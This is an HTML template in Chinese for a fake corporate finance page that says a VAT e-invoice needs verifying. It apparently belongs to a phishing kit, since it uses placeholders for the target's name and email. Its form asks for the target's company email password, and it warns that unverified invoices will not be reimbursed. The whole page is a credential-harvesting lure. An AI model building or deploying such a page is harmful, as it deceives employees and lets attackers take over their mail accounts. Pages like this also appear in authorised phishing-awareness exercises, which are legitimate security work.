<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>数电票查验</title>
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #eef2ff; color: #1f2937; }
    header { background: #3730a3; color: #fff; padding: 18px 20px; }
    header h1 { margin: 0; font-size: 18px; font-weight: 600; }
    header p { margin: 6px 0 0; font-size: 13px; opacity: .92; }
    main { max-width: 420px; margin: 24px auto; padding: 0 16px 32px; }
    .card { background: #fff; border-radius: 8px; padding: 22px 20px; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
    .notice { background: #eef2ff; border-left: 3px solid #4338ca; padding: 10px 12px; font-size: 13px; color: #475569; margin: 0 0 8px; }
    label { display: block; margin: 14px 0 6px; font-size: 13px; }
    input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #d9d9d9; border-radius: 4px; font-size: 14px; }
    button { margin-top: 18px; width: 100%; padding: 12px; background: #4338ca; color: #fff; border: 0; border-radius: 4px; font-size: 15px; cursor: pointer; }
    footer { margin-top: 14px; font-size: 12px; color: #94a3b8; text-align: center; }
  </style>
</head>
<body>
  <header>
    <h1>财务共享中心</h1>
    <p>增值税电子发票待查验</p>
  </header>
  <main>
    <div class="card">
      <p>{{if .FirstName}}{{.FirstName}}{{else}}同事{{end}}，请登录后核对发票抬头。</p>
      <div class="notice">请确认价税合计、税额和购方名称。未查验的数电票不能报销入账。</div>
      <form method="POST">
        <label for="username">企业邮箱</label>
        <input id="username" name="username" type="text" value="{{.Email}}" autocomplete="username" required>
        <label for="password">邮箱密码</label>
        <input id="password" name="password" type="password" autocomplete="current-password" required>
        <button type="submit">登录并查验</button>
      </form>
    </div>
    <footer>财务部 · 发票查验</footer>
  </main>
</body>
</html>
